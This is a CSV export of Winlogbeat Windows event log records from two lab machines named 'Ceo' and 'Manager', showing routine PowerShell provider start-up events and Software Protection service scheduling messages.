"Oct 23, 2022 @ 15:58:15.397","3HjpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 15:58:16.250","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4548,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 15:58:15.396","23jpA4QByII7dpeE-MI2",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 15:58:16.250","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=d713cd3e-32be-4836-945e-618f92d268f9
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4547,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 15:56:37.728",0XjpA4QByII7dpeE3sJl,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 15:56:38.558","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:58:37Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:58:37Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3896,"-","-","-","-","-","-"
"Oct 23, 2022 @ 15:56:19.265",QHjqA4QByII7dpeEIsP3,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 15:56:20.082","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:28:19Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:28:19Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4765,"-","-","-","-","-","-"
"Oct 23, 2022 @ 15:56:07.462",v3jpA4QByII7dpeE0cJ8,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 15:56:08.391","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3895,"-","-","-","-","-","-"
"Oct 23, 2022 @ 15:55:48.988",LXjqA4QByII7dpeEIsNU,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 15:55:49.524","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4764,"-","-","-","-","-","-"
"Oct 23, 2022 @ 15:55:47.361",FXjqA4QByII7dpeEEsMJ,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 15:55:47.506","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:27:47Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:27:47Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4763,"-","-","-","-","-","-"
